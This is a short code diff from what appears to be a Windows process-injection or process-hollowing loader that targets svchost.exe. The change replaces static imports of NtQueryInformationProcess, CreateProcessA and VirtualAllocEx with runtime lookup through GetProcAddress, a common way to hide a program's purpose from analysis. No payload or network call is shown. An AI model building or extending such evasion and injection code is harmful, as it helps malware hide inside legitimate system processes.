@@ -7,19 +7,25 @@
 #ifndef NT_SUCCESS
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 #endif
-
-//TODO: dynamic API resolution instead of static imports
-
-constexpr auto exe_path{R"(C:\Windows\System32\svchost.exe)"};
-
 #define FLG_HEAP_ENABLE_TAIL_CHECK 0x10
 #define FLG_HEAP_ENABLE_FREE_CHECK 0x20
 #define FLG_HEAP_VALIDATE_PARAMETERS 0x40
 
+
 auto main() -> int {
+    constexpr auto exe_path{R"(C:\Windows\System32\svchost.exe)"};
+
+    //these are the required DLLs that are loaded at runtime
+    HMODULE hNtdll = LoadLibrary(TEXT("ntdll.dll"));
+    HMODULE hKernel32 = LoadLibrary(TEXT("kernel32.dll"));
+
+    //these are the function addresses resolved using GetProcAddress.
+    //the static API calls have been replaced with the dynamically resolved func ptrs.
+    NtQueryInformationProcess_t NtQueryInformationProcess = reinterpret_cast<NtQueryInformationProcess_t>(GetProcAddress(hNtdll, "NtQueryInformationProcess"));
+    CreateProcessA_t CreateProcess = reinterpret_cast<CreateProcessA_t>(GetProcAddress(hKernel32, "CreateProcessA"));
+    VirtualAllocEx_t VirtualAllocEx = reinterpret_cast<VirtualAllocEx_t>(GetProcAddress(hKernel32, "VirtualAllocEx"));
 
     // Parse headers and validate the NT header
-
     auto dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(raw_data);
     auto nt_header = process::get_nt_header(dos_header);
 
